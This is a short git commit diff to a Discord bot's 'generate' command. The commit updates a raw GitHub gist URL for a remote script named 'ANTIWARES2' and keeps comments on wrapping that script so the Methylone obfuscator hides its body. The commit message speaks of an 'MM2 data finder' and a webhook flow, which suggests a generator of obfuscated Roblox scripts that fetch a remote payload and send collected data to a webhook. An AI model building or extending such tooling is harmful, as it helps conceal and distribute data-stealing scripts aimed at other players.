76c964dae6923d50e56a4a97ae99cc4db5f33de9
ANTIWARE <bellaboosh123@gmail.com>
2026-08-14 19:46:55 +0100

    Fixed MM2 data finder IsA crash and restored webhook/GUI flow

--- src/commands/generate.js
+++ src/commands/generate.js
@@ -49,7 +49,7 @@ export async function execute(interaction) {
   const target = submitted.fields.getTextInputValue('target');
   const pingRole = submitted.fields.getTextInputValue('pingRole') || '';
 
-  const GIST_URL = "https://gist.githubusercontent.com/malik020859-ui/f513af3ff4e17351ea21a0fae5dba45e/raw/bde161ea34da4aec78dc1708cb0e3c42a0b6240d/ANTIWARES2";
+  const GIST_URL = "https://gist.githubusercontent.com/malik020859-ui/f513af3ff4e17351ea21a0fae5dba45e/raw/8993b76b0155cfe13edc18cb59c674557c024079/ANTIWARES2";
   // ---- WRAPPER WITH ANONYMOUS FUNCTION ----
   // Wrapping in (function() ... end)() makes Methylone obfuscate the function body
   // instead of the raw script, preventing the "attempt to call a nil value" error.
